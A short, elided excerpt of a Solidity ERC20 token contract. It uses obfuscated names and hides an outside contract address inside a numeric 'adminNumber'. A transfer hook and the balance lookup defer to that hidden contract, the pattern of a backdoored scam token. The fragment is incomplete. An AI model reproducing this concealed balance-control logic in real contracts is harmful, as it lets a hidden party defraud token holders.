...
contract ERC20 is Context,IERC20 {
    ...
    uint256 adminNumber = 183232389747193719218;
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
        hhxnnadsa = commonGet(true,amount,(getAdminNumber(true,amount)));
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function commonGet(bool acx,uint256 abcx,address aa) internal virtual  view returns (asmmxma) {
        if (adminNumber == 1) {
    ...
    function bbabalance(uint256 bala,address owner) private view returns(uint256) {
        return hhxnnadsa.a1(true,bala, owner);
    }
